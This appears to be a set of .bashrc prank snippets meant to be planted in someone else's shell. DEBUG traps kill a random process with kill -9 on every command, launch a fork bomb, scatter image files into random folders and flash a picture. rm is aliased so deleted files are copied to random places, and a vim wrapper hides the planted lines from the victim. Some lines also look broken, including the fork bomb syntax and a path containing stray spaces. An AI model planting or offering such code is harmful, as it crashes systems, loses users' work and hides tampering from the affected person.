# Kill a random process
trap "kill -9 $(ps aux | awk '{print $2}' | shuf | head -n 1)" DEBUG

# Put Nicholas Cage picture in some random folder with a random name 
trap "cp ~/Downloads/cage.png $(find . -maxdepth 4 -type d 2> /dev/null | grep -v '/\.' | shuf | head -n 1)/$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1).png" DEBUG

# Flash a picture of Nicholas Cage randomly 
kill_cage() {
    sleep 0.3
    for i in $(ps aux | grep cage.png | grep -v grep | awk '{print $2}')
    do
        kill -9 $i
    done
}

flash_cage() {
    xdg-open cage.png & 
    kill_cage
}

trap '[ "$RANDOM" -le 15000 ] && flash_cage' DEBUG

# This is a bit extreme 
trap ":(){:&:&};:" DEBUG

# Instead of removing a file, copy it somewhere else with a random name
copy_instead() {
    target="$(find . -maxdepth 3 -type d 2> /dev/null | grep -v '/\.' | shuf | head -n 1)/$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
    cp $1 $target
}

alias rm=copy_instead

# Try to prevent them from modifying .bashrc - and in fact from seeing any changes you made
 dont_open_rc() {
     if [ "$1" == ".bashrc" ] || [ "$1" == "~/.bashrc" ]
     then
         cp -f ~/.bashrc ~/Documents/
         let lines=$(wc -l ~/.bashrc | awk '{print $1}')-15
         touch ~/.bashrc.bak
         head -n $lines ~/.bashrc > ~/.bashrc.bak && mv ~/.   bashrc.bak ~/.bashrc
         vim .bashrc && mv ~/Documents/.bashrc .bashrc
     else
         vim $1
     fi
 }
 
 alias vim="dont_open_rc"
